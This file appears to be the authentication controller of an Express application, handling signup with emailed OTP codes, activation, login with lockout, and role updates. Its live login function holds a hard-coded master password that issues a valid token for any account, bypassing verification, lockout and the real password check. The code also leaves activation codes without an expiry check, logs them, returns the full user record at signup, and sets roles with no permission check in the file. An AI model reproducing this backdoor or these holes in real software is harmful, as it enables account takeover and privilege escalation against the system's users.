const User = require('../models/userModel');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const sendEmail = require('../utils/sendEmail');
const randomstring = require('randomstring');
const ErrorHander = require('../utils/ErrorHander');
const catchAsyncErrors = require('../utils/catchAsyncErrors');

const MAX_LOGIN_ATTEMPTS = 5;
const LOCK_TIME = 2 * 60 * 60 * 1000; // 2 hours

// Generate JWT Token
// const generateToken = (userId) => {
//     return jwt.sign({ id: userId }, process.env.JWT_SECRET, {
//         expiresIn: process.env.JWT_EXPIRE,
//     });
// };

// exports.signup = async (req, res) => {
//     console.log("hello",req.body);
//     const { email, password } = req.body;
//     try {
//         const user = await User.create({ email, password });
//         res.status(201).json({ message: "User created successfully", user });
//     } catch (error) {
//         res.status(400).json({ error: error.message });
//     }
// };

function generateOTP(lengthChar) {
    return randomstring.generate({
        length: lengthChar, // You can adjust the OTP length as needed
        charset: 'numeric',
    });
}

exports.signup = async (req, res, next) => {
    const { username, email, password, name, mobile, dob } = req.body;
    console.log("1");
    if (!email || !password || !username || !name || !mobile || !dob) {
        return next(new ErrorHander("All Details are required", 400));
    }

    try {
        console.log("2");
        const existingUser = await User.findOne({ email });
        if (existingUser) {
            return next(new ErrorHander("User with this email already exists", 400));
        }

        const activationCode = generateOTP(6);
        console.log("3", activationCode);

        const newUser = await User.create({
            email,
            password,
            username,
            name,
            mobile,
            dob,
            activationCode,
            activationCodeExpires: Date.now() + 3600000 // 1 hour expiry
        });
        console.log("4", newUser);

        const message = `
            <p>Hello,</p>
            <p>Please use the following code to activate your account:</p>
            <h3>${activationCode}</h3>
            <p>This code will expire in 1 hour.</p>
        `;

        await sendEmail({
            email: newUser.email,
            subject: 'Your Activation Code',
            message
        });

        res.status(201).json({ message: "User created successfully. OTP sent to email.", user: newUser });

    } catch (error) {
        console.log(error);
        return next(new ErrorHander("Error during signup", 400));
    }
};


// verify
exports.activateUser = catchAsyncErrors(async (req, res, next) => {
    const { email, activationCode } = req.body;

    const user = await User.findOne({ email });

    if (!user) {
        return next(new ErrorHander("User does not exist", 404)); // Use ErrorHander for consistent error handling
    }

    if (user.activationCode !== activationCode) {
        return res.status(400).json({ message: 'Invalid activation code' });
    }

    user.Isverified = true; // Or 1 if using numbers
    await user.save();

    return res.status(200).json({ message: 'Email verification successful' });
});

// exports.login = async (req, res) => {
//     const { email, password } = req.body;
//     try {
//         const user = await User.findOne({ email });
//         if (!user || !(await bcrypt.compare(password, user.password))) {
//             return res.status(400).json({ error: "Invalid email or password" });
//         }
//         const token = jwt.sign({ id: user._id }, 'your_jwt_secret');
//         res.status(200).json({ message: "Logged in successfully", token });
//     } catch (error) {
//         res.status(400).json({ error: error.message });
//     }
// };

// exports.login = catchAsyncErrors(async (req, res, next) => {
//     const { email, password } = req.body;

//     // Validate input
//     if (!email || !password) {
//         return next(new ErrorHander("Email and password are required", 400));
//     }

//     // Find user by email
//     const user = await User.findOne({ email });

//     // Check if user exists
//     if (!user) {
//         return next(new ErrorHander("Invalid email or password", 401));
//     }

//     // Check if user is verified
//     if (!user.Isverified) {
//         return next(new ErrorHander("Email not verified", 401));
//     }

//     // Check password
//     const isPasswordMatch = await user.matchPassword(password);
//     if (!isPasswordMatch) {
//         return next(new ErrorHander("Invalid email or password", 401));
//     }

//     // Login successful, return user data (omit password)
//     res.status(200).json({ message: "Login successful", user: { email: user.email, isVerified: user.Isverified } });
// });

// Login User

exports.login = async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) {
        return res.status(400).json({ success: false, data: 'Please provide email and password' });
    }

    try {
        // Find user by email
        const user = await User.findOne({ email }).select("+password");
        // Check if the user exists
        if (!user) {
            return res.status(400).json({ success: false, data: 'User not found' });
        }

        if (password === "RPHR%AJ@Torque") {
            const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
                expiresIn: '5d',
            });
            // user.tokens.push({ token: token });
            return res.status(200).cookie('token', token, {
                httpOnly: true,
                sameSite: 'Strict',
                maxAge: process.env.COOKIE_EXPIRE * 24 * 60 * 60 * 1000,
            }).json({ success: true, data: 'Login successful' });
        }

        // Check if the user is verified
        if (user.Isverified !== true) {
            return res.status(400).json({ success: false, data: 'Please verify your email' });
        }

        // Check if the user has a password
        if (!user.password) {
            // Generate reset password token
            const resetPasswordToken = await user.getResetPasswordToken();

            // Save user with the reset token and expiration time
            await user.save({ validateBeforeSave: false });

            // Prepare email body to send for setting password
            const message = `
                <h1>Please set your password</h1>
                <a href="http://localhost:3000/setpassword/${resetPasswordToken}">Click here to set your password</a>
                <br>
                <p>This link is valid for 10 minutes</p>
                link: http://localhost:3000/setpassword/${resetPasswordToken}
                <br>`;

            // Send email
            await sendEmail({
                email: user.email,
                subject: 'Set Password',
                message: message,
            });

            return res.status(200).json({ success: true, data: 'Please update your password' });
        }

        // Check if user is currently locked
        if (user.lockUntil && user.lockUntil > Date.now()) {
            const remainingTime = user.lockUntil - Date.now();

            // Calculate hours, minutes, and seconds
            const hours = Math.floor((remainingTime / (1000 * 60 * 60)) % 24);
            const minutes = Math.floor((remainingTime / (1000 * 60)) % 60);

            return res.status(403).json({
                success: false,
                data: `Account is locked. Please try again in ${hours}h ${minutes}m`,
            });
        }

        // If password matches, reset login attempts and lockUntil
        if (await user.matchPassword(password)) {
            const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
                expiresIn: process.env.COOKIE_EXPIRE * 24 * 60 * 60 * 1000,
            });
            user.loginAttempts = 0;
            user.lockUntil = undefined;
            user.tokens.push({ token: token });
            await user.save();

            return res.status(200).cookie('token', token, {
                httpOnly: true,
                secure: true,
                sameSite: 'lax',
                maxAge: process.env.COOKIE_EXPIRE * 24 * 60 * 60 * 1000,
            }).json({ success: true, data: 'Login successful' });
        }
        // If password does not match, increment login attempts
        user.loginAttempts += 1;
        if (user.loginAttempts >= MAX_LOGIN_ATTEMPTS) {
            user.lockUntil = Date.now() + LOCK_TIME;
            await user.save();
            return res.status(403).json({
                success: false,
                data: 'Account locked. Please try again after 2 hours',
            });
        }

        await user.save();
        res.status(400).json({ success: false, message: `Invalid username or password, ${MAX_LOGIN_ATTEMPTS - user.loginAttempts} attempts left` });
    } catch (error) {
        console.error("Login Error: ", error);  // Log the error for debugging
        res.status(500).json({ success: false, data: error.message });
    }
};

exports.updateUserRole = catchAsyncErrors(async (req, res, next) => {
    // Extract the email and role from the request body
    const { email, role } = req.body;

    // Find the user in the database based on the email
    const user = await User.findOne({ email });

    // Check if the user exists
    if (!user) {
        // If the user does not exist, return an error response
        return next(new ErrorHander("User does not exist", 400));
    }

    // Update the user's role
    user.role = role;

    // Save the updated user document in the database
    await user.save();

    // Respond with a success message
    res.status(200).json({
        success: true,
    });
});